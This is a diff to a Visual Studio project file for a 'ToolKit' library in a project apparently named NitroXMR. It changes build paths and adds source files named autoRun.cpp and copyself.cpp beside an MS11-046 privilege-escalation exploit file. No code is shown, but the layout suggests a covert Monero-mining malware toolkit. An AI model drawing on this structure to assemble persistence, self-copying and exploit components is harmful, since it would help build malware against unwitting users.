@@ -71,8 +71,8 @@
   </ImportGroup>
   <PropertyGroup Label="UserMacros" />
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
-    <IntDir>ToolKit.dir\RelWithDebInfo\</IntDir>
-    <OutDir>$(ProjectDir)RelWithDebInfo\</OutDir>
+    <IntDir>$(projectdir)\$(configuration)\</IntDir>
+    <OutDir>$(projectdir)\$(configuration)\</OutDir>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <OutDir>$(ProjectDir)$(Configuration)\</OutDir>
@@ -86,7 +86,7 @@
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <IntrinsicFunctions>true</IntrinsicFunctions>
       <PreprocessorDefinitions>WIN32;NDEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
-      <AdditionalIncludeDirectories>F:\Documents\Visual Studio 2017\Projects\XMR\NitroXMR\src\3rdparty\libsysaux;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <AdditionalIncludeDirectories>G:\Documents\Visual Studio 2017\Projects\XMR\NitroXMR\src\3rdparty\libsysaux;G:\Documents\Visual Studio 2017\Projects\XMR\NitroXMR\src\ToolKit;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
     </ClCompile>
     <Link>
       <SubSystem>Windows</SubSystem>
@@ -140,6 +140,8 @@
     <ClInclude Include="ToolKit.h" />
   </ItemGroup>
   <ItemGroup>
+    <ClCompile Include="autoRun.cpp" />
+    <ClCompile Include="copyself.cpp" />
     <ClCompile Include="MS11-046%28x86%29.cpp" />
     <ClCompile Include="stdafx.cpp">
       <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
